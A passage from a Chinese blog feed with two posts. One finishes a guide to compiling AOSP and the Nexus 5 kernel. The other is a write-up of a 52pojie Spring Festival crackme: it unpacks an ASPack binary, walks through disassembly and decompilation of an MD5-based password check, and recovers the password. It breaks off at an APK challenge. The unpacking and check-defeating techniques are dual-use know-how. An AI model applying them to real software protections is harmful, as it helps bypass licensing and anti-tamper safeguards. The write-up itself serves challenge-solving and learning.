style="text-align:center">packages</td><td style="text-align:center">应用程序源码</td></tr><tr><td style="text-align:center">pdk</td></tr><tr><td style="text-align:center">prebuilts</td><td style="text-align:center">镜像生成依赖的一些文件，如 gcc、kernel 等</td></tr><tr><td style="text-align:center">sdk</td><td style="text-align:center">sdk 源码，模拟器源码</td></tr><tr><td style="text-align:center">system</td><td style="text-align:center">底层文件系统库、应用及组件（C 语言）</td></tr><tr><td style="text-align:center">tools</td></tr></tbody></table><h2 id="内核代码"><a href="#内核代码" class="headerlink" title="内核代码"></a>内核代码</h2><p>编译内核代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/kernel/msm</span><br><span class="line"><span class="comment"># git clone https://android.googlesource.com/kernel/msm</span></span><br><span class="line"><span class="built_in">cd</span> msm</span><br><span class="line">git branch -a</span><br><span class="line">git checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1</span><br><span class="line">sudo -i <span class="comment"># 在root下进行编译</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$PATH</span>:<span class="variable">$WORKING_DIRECTORY</span>/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin"</span></span><br><span class="line"><span class="built_in">export</span> ARCH=arm</span><br><span class="line"><span class="built_in">export</span> SUBARCH=arm</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=arm-eabi-</span><br><span class="line">make hammerhead_defconfig</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch aosp_hammerhead-userdebug</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>刷机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot -w flashall</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">编译命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">m</td><td style="text-align:center">编译所有的模块</td></tr><tr><td style="text-align:center">mm</td><td style="text-align:center">编译当前目录下的模块，当前目录下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">mmm</td><td style="text-align:center">编译指定路径下的模块，指定路径下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">make snod</td><td style="text-align:center">部分编译完后，使用该命令来编译的结果整合到镜像中</td></tr></tbody></table><h2 id="使用-Docker-进行编译-Android-源码"><a href="#使用-Docker-进行编译-Android-源码" class="headerlink" title="使用 Docker 进行编译 Android 源码"></a>使用 Docker 进行编译 Android 源码</h2><p>源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &amp;&amp; mkdir build</span><br><span class="line"><span class="built_in">export</span> AOSP_VOL=<span class="string">"<span class="variable">$HOME</span>/build"</span></span><br><span class="line">wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh <span class="comment"># 连接不上的话改一下hosts</span></span><br><span class="line">bash build-kitkat.sh</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://source.android.com/setup?hl=en" target="_blank" rel="noopener">https://source.android.com/setup?hl=en</a><br><a href="https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html</a><br><a href="https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html</a><br><a href="https://blog.csdn.net/u012417380/article/details/72809141" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/72809141</a><br><a href="https://blog.csdn.net/u012417380/article/details/73196722" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73196722</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73353670</a><br><a href="https://blog.csdn.net/sergeycao/article/details/46459419" target="_blank" rel="noopener">https://blog.csdn.net/sergeycao/article/details/46459419</a><br><a href="https://www.jianshu.com/p/3bdf6e9f9dfe" target="_blank" rel="noopener">https://www.jianshu.com/p/3bdf6e9f9dfe</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>2020春节-吾爱破解解题领红包活动</title>
    <link href="blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <id>blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/</id>
    <published>2020-02-11T03:37:58.000Z</published>
    <updated>2020-03-15T04:07:00.942Z</updated>
    
    <content type="html"><![CDATA[<p>第二次参加领红包活动，这次有两题是 apk。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>公众号回复直接得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/1.jpg" alt="公众号直接获取口令"></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳发现有 ASPack 壳，直接上 ESP 定律把壳脱掉：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/2.png" alt="Exeinfo查壳"></p><p>然后用 OD 看一下 dump 下来的程序，先搜索字符串，可以看到输入正确后返回的字符串：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/3.png" alt="发现关键字符串"></p><p>然后定位到具体的函数位置，看下来感觉有点复杂，但大概可以看到涉及到了三个字符串，可以判断出是类似 MD5 的哈希摘要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">00617D34   .  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-0x10]</span><br><span class="line">00617D37   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC</span><br><span class="line">00617D3D   .  8B12          MOV EDX,DWORD PTR DS:[EDX]</span><br><span class="line">00617D3F   .  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-0x4]</span><br><span class="line">00617D42   .  E8 597DE1FF   CALL dumped_.0042FAA0</span><br><span class="line">00617D47   .  8B45 F0       MOV EAX,DWORD PTR SS:[EBP-0x10]</span><br><span class="line">00617D4A   .  BA B87E6100   MOV EDX,dumped_.00617EB8          ;  E7EE5F4653E31955CACC7CD68E2A7839</span><br><span class="line">00617D4F   .  E8 A42DDFFF   CALL dumped_.0040AAF8</span><br><span class="line">00617D54   .  0F9445 E7     SETE BYTE PTR SS:[EBP-0x19]</span><br><span class="line">00617D58   .  33C0          XOR EAX,EAX</span><br><span class="line">00617D5A   .  5A            POP EDX</span><br><span class="line">00617D5B   .  59            POP ECX</span><br><span class="line">00617D5C   .  59            POP ECX</span><br><span class="line">00617D5D   .  64:8910       MOV DWORD PTR FS:[EAX],EDX</span><br><span class="line">00617D60   .  68 757D6100   PUSH dumped_.00617D75</span><br><span class="line">00617D65   &gt;  8D45 F0       LEA EAX,DWORD PTR SS:[EBP-0x10]</span><br><span class="line">00617D68   .  E8 4F1FDFFF   CALL dumped_.00409CBC</span><br><span class="line">00617D6D   .  C3            RETN</span><br><span class="line">00617D6E   .- E9 6515DFFF   JMP dumped_.004092D8</span><br><span class="line">00617D73   .^ EB F0         JMP SHORT dumped_.00617D65</span><br><span class="line">00617D75   .  807D E7 00    CMP BYTE PTR SS:[EBP-0x19],0x0</span><br><span class="line">00617D79   .  74 57         JE SHORT dumped_.00617DD2</span><br><span class="line">00617D7B   .  33C0          XOR EAX,EAX</span><br><span class="line">00617D7D   .  55            PUSH EBP</span><br><span class="line">00617D7E   .  68 CB7D6100   PUSH dumped_.00617DCB</span><br><span class="line">00617D83   .  64:FF30       PUSH DWORD PTR FS:[EAX]</span><br><span class="line">00617D86   .  64:8920       MOV DWORD PTR FS:[EAX],ESP</span><br><span class="line">00617D89   .  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">00617D8C   .  E8 2B1FDFFF   CALL dumped_.00409CBC</span><br><span class="line">00617D91   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">00617D94   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC</span><br><span class="line">00617D9A   .  8B12          MOV EDX,DWORD PTR DS:[EDX]</span><br><span class="line">00617D9C   .  8D45 F8       LEA EAX,DWORD PTR SS:[EBP-0x8]</span><br><span class="line">00617D9F   .  E8 7C7CE1FF   CALL dumped_.0042FA20</span><br><span class="line">00617DA4   .  8B45 EC       MOV EAX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">00617DA7   .  BA 087F6100   MOV EDX,dumped_.00617F08          ;  ea6b2efbdd4255a9f1b3bbc6399b58f4</span><br><span class="line">00617DAC   .  E8 472DDFFF   CALL dumped_.0040AAF8</span><br><span class="line">00617DB1   .  0F9445 E6     SETE BYTE PTR SS:[EBP-0x1A]</span><br><span class="line">00617DB5   .  33C0          XOR EAX,EAX</span><br><span class="line">00617DB7   .  5A            POP EDX</span><br><span class="line">00617DB8   .  59            POP ECX</span><br><span class="line">00617DB9   .  59            POP ECX</span><br><span class="line">00617DBA   .  64:8910       MOV DWORD PTR FS:[EAX],EDX</span><br><span class="line">00617DBD   .  68 D67D6100   PUSH dumped_.00617DD6</span><br><span class="line">00617DC2   &gt;  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]</span><br><span class="line">00617DC5   .  E8 F21EDFFF   CALL dumped_.00409CBC</span><br><span class="line">00617DCA   .  C3            RETN</span><br><span class="line">00617DCB   .- E9 0815DFFF   JMP dumped_.004092D8</span><br><span class="line">00617DD0   .^ EB F0         JMP SHORT dumped_.00617DC2</span><br><span class="line">00617DD2   &gt;  C645 E6 00    MOV BYTE PTR SS:[EBP-0x1A],0x0</span><br><span class="line">00617DD6   .  807D E6 00    CMP BYTE PTR SS:[EBP-0x1A],0x0</span><br><span class="line">00617DDA   .  74 6D         JE SHORT dumped_.00617E49</span><br><span class="line">00617DDC   .  33C0          XOR EAX,EAX</span><br><span class="line">00617DDE   .  55            PUSH EBP</span><br><span class="line">00617DDF   .  68 2C7E6100   PUSH dumped_.00617E2C</span><br><span class="line">00617DE4   .  64:FF30       PUSH DWORD PTR FS:[EAX]</span><br><span class="line">00617DE7   .  64:8920       MOV DWORD PTR FS:[EAX],ESP</span><br><span class="line">00617DEA   .  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]</span><br><span class="line">00617DED   .  E8 CA1EDFFF   CALL dumped_.00409CBC</span><br><span class="line">00617DF2   .  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-0x18]</span><br><span class="line">00617DF5   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC</span><br><span class="line">00617DFB   .  8B12          MOV EDX,DWORD PTR DS:[EDX]</span><br><span class="line">00617DFD   .  8D45 F4       LEA EAX,DWORD PTR SS:[EBP-0xC]</span><br><span class="line">00617E00   .  E8 1B7CE1FF   CALL dumped_.0042FA20</span><br><span class="line">00617E05   .  8B45 E8       MOV EAX,DWORD PTR SS:[EBP-0x18]</span><br><span class="line">00617E08   .  BA 587F6100   MOV EDX,dumped_.00617F58          ;  c8d46d341bea4fd5bff866a65ff8aea9</span><br><span class="line">00617E0D   .  E8 E62CDFFF   CALL dumped_.0040AAF8</span><br><span class="line">00617E12   .  0F9445 E5     SETE BYTE PTR SS:[EBP-0x1B]</span><br><span class="line">00617E16   .  33C0          XOR EAX,EAX</span><br><span class="line">00617E18   .  5A            POP EDX</span><br><span class="line">00617E19   .  59            POP ECX</span><br><span class="line">00617E1A   .  59            POP ECX</span><br><span class="line">00617E1B   .  64:8910       MOV DWORD PTR FS:[EAX],EDX</span><br><span class="line">00617E1E   .  68 337E6100   PUSH dumped_.00617E33</span><br><span class="line">00617E23   &gt;  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]</span><br><span class="line">00617E26   .  E8 911EDFFF   CALL dumped_.00409CBC</span><br><span class="line">00617E2B   .  C3            RETN</span><br><span class="line">00617E2C   .- E9 A714DFFF   JMP dumped_.004092D8</span><br><span class="line">00617E31   .^ EB F0         JMP SHORT dumped_.00617E23</span><br><span class="line">00617E33   .  807D E5 00    CMP BYTE PTR SS:[EBP-0x1B],0x0</span><br><span class="line">00617E37   .  74 10         JE SHORT dumped_.00617E49</span><br><span class="line">00617E39   .  83C9 FF       OR ECX,-0x1</span><br><span class="line">00617E3C   .  83CA FF       OR EDX,-0x1</span><br><span class="line">00617E3F   .  B8 A87F6100   MOV EAX,dumped_.00617FA8          ;  请把答案回复到论坛公众号！</span><br><span class="line">00617E44   .  E8 236BF5FF   CALL dumped_.0056E96C</span><br></pre></td></tr></table></figure><p>抛弃 OD，把 dump 下来的程序导入 IDA，根据前面找到的 unicode 字符串定位到函数，反编译后得到如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">TForm1_edtPwdChange</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> md5Handler; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp-18h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// [esp-14h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [esp-10h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [esp-Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// [esp-8h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// [esp-4h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+8h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+Ch] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+10h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+14h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+1Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+20h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+25h] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+26h] [ebp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+27h] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> *string3; <span class="comment">// [esp+28h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *string2; <span class="comment">// [esp+2Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *string1; <span class="comment">// [esp+30h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> s3; <span class="comment">// [esp+34h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [esp+38h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> savedregs; <span class="comment">// [esp+40h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v12 = &amp;savedregs;</span><br><span class="line">  v11 = &amp;loc_617E9C;</span><br><span class="line">  v10 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">  __writefsdword(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v10);</span><br><span class="line">  sub_541DB8(*(Controls::TControl **)(a1 + <span class="number">976</span>), &amp;v19);</span><br><span class="line">  len = v19;</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">    len = *(_DWORD *)(v19 - <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len == <span class="number">15</span> )                              <span class="comment">// input's length should be 15</span></span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v2) = <span class="number">1</span>;</span><br><span class="line">    md5Handler = sub_616B84(&amp;cls_IdHashMessageDigest_TIdHashMessageDigest5, v2);<span class="comment">// get MD5 handler</span></span><br><span class="line">    v9 = &amp;s1;</span><br><span class="line">    sub_541DB8(*(Controls::TControl **)(v1 + <span class="number">976</span>), &amp;v17);</span><br><span class="line">    sub_50F2EC(v17, <span class="number">7</span>, &amp;v18);</span><br><span class="line">    registerFunc(md5Handler, v18, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;s1);</span><br><span class="line">    v9 = &amp;s2;</span><br><span class="line">    v8 = &amp;v16;</span><br><span class="line">    sub_541DB8(*(Controls::TControl **)(v1 + <span class="number">976</span>), &amp;v15);</span><br><span class="line">    Compprod::TComponentsPageProducer::HandleTag(&amp;v16);</span><br><span class="line">    registerFunc(md5Handler, v16, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;s2);</span><br><span class="line">    v9 = &amp;s3;</span><br><span class="line">    sub_541DB8(*(Controls::TControl **)(v1 + <span class="number">976</span>), &amp;v13);</span><br><span class="line">    unknown_libname_807(v13, <span class="number">4</span>, &amp;v14);</span><br><span class="line">    registerFunc(md5Handler, v14, <span class="number">0</span>, (<span class="keyword">int</span>)&amp;s3);</span><br><span class="line">    v9 = (<span class="keyword">char</span> *)&amp;savedregs;</span><br><span class="line">    v8 = (<span class="keyword">int</span> *)&amp;loc_617D6E;</span><br><span class="line">    v7 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">    __writefsdword(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v7);</span><br><span class="line">    freeMem(&amp;string1);</span><br><span class="line">    sub_42FAA0((<span class="keyword">int</span> *)&amp;s1, <span class="number">0</span>, (<span class="keyword">int</span> *)&amp;string1);</span><br><span class="line">    compareStr(string1, (<span class="keyword">char</span> *)<span class="string">L"E7EE5F4653E31955CACC7CD68E2A7839"</span>);<span class="comment">// compare string1</span></span><br><span class="line">    v22 = v5;</span><br><span class="line">    __writefsdword(<span class="number">0</span>, v7);</span><br><span class="line">    v9 = (<span class="keyword">char</span> *)&amp;loc_617D75;</span><br><span class="line">    freeMem(&amp;string1);</span><br><span class="line">    <span class="keyword">if</span> ( v22 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (<span class="keyword">char</span> *)&amp;savedregs;</span><br><span class="line">      v8 = (<span class="keyword">int</span> *)&amp;loc_617DCB;</span><br><span class="line">      v7 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">      __writefsdword(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v7);</span><br><span class="line">      freeMem(&amp;string2);</span><br><span class="line">      sub_42FA20(&amp;s2, <span class="number">0</span>, &amp;string2);</span><br><span class="line">      compareStr(string2, (<span class="keyword">char</span> *)<span class="string">L"ea6b2efbdd4255a9f1b3bbc6399b58f4"</span>);<span class="comment">// compare string2</span></span><br><span class="line">      v21 = v5;</span><br><span class="line">      __writefsdword(<span class="number">0</span>, v7);</span><br><span class="line">      v9 = (<span class="keyword">char</span> *)&amp;loc_617DD6;</span><br><span class="line">      freeMem(&amp;string2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v21 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (<span class="keyword">char</span> *)&amp;savedregs;</span><br><span class="line">      v8 = (<span class="keyword">int</span> *)&amp;loc_617E2C;</span><br><span class="line">      v7 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">      __writefsdword(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v7);</span><br><span class="line">      freeMem(&amp;string3);</span><br><span class="line">      sub_42FA20(&amp;s3, <span class="number">0</span>, &amp;string3);</span><br><span class="line">      compareStr(string3, (<span class="keyword">char</span> *)<span class="string">L"c8d46d341bea4fd5bff866a65ff8aea9"</span>);<span class="comment">// compare string3</span></span><br><span class="line">      v20 = v5;</span><br><span class="line">      __writefsdword(<span class="number">0</span>, v7);</span><br><span class="line">      v9 = (<span class="keyword">char</span> *)&amp;loc_617E33;</span><br><span class="line">      freeMem(&amp;string3);</span><br><span class="line">      <span class="keyword">if</span> ( v20 )                                <span class="comment">// Success</span></span><br><span class="line">        createDialog((<span class="keyword">int</span>)<span class="string">L"请把答案回复到论坛公众号！"</span>, <span class="number">-1</span>, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __writefsdword(<span class="number">0</span>, v10);</span><br><span class="line">  v12 = (<span class="keyword">int</span> *)&amp;loc_617EA3;</span><br><span class="line">  freeMem(&amp;v13);</span><br><span class="line">  freeMem(&amp;v14);</span><br><span class="line">  freeMem(&amp;v15);</span><br><span class="line">  freeMem(&amp;v16);</span><br><span class="line">  freeMem(&amp;v17);</span><br><span class="line">  freeMem(&amp;v18);</span><br><span class="line">  freeMem(&amp;v19);</span><br><span class="line">  <span class="keyword">return</span> sub_409D1C(&amp;string3, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译后的代码也比较含糊，但可以猜到，输入的字符串长度为 15，字符串被分成了 3 部分，每部分分别进行 MD5 哈希，并与内存中的字符串进行比较，字符串正确就会弹出一个正确的对话窗口。MD5 在理论上是不可逆的，但可以在通过搜索引擎查找网上已经被爆破出的对应的明文。第一部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/4.png" alt="第一个md5的原字符串"></p><p>第二部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/5.png" alt="第二个md5的原字符串"></p><p>第三部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/6.png" alt="第三个md5的原字符串"></p><p>将得到的字符串拼接并进行验证：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/7.png" alt="检验字符串"></p><p>回复公众号得到口令</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/8.jpg" alt="得到口令"></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这题给的是一个 apk，先使用 jdax 打开，查看程序入口点 MainActivity，得到如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 